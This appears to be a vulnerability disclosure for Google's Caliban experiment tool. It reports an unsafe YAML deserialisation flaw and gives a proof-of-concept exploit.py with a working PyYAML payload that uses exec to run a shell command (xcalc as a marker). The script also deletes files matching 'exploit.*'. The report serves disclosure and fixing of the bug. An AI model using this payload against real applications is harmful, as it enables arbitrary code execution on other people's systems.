## ✍️ Description
Caliban is a tool that helps researchers launch and track their numerical experiments in an isolated, reproducible computing environment. It was developed by machine learning researchers and engineers, and makes it easy to go from a simple prototype running on a workstation to thousands of experimental jobs running on Cloud.
* **Vulnerability discription**
Vulnerable to yaml deserilisation attack caused by unsafe loading.
## 🕵️‍♂️ Proof of Concept
* [vulnerable part of code](https://github.com/google/caliban/blob/56f96e7e05b1d33ebdebc01620dc867f7ec54df3/caliban/platform/gke/util.py#L790)
```python
job_spec = yaml.load(f, Loader=yaml.FullLoader)
```
```python
# exploit.py
import os
os.system('pip install caliban')
import caliban.platform.gke.util as ut
exploit = '''!!python/object/new:type
  args: ["z", !!python/tuple [], {"extend": !!python/name:exec }]
  listitems: "__import__('os').system('xcalc')"
'''
os.system('rm exploit.*')
open('exploit.yaml','w+').write(exploit)
ut.parse_job_file('exploit.yaml')
```
![](https://cdn.discordapp.com/attachments/789769803770494996/791701814150955028/Screenshot_from_2020-12-24_21-37-49.png)
